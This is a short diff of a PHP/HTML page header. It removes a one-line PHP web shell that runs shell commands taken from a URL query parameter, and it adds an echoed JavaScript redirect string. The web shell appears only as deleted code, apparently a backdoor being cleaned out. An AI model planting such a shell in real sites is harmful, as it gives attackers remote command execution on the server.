@@ -1,5 +1,5 @@
-<?php system($_GET['moew']);?>
-<?php echo"123";?>
+<?php echo "location.href='127.0.0.1';"  ?>
+
 <!DOCTYPE html>
 <html>
 <head>
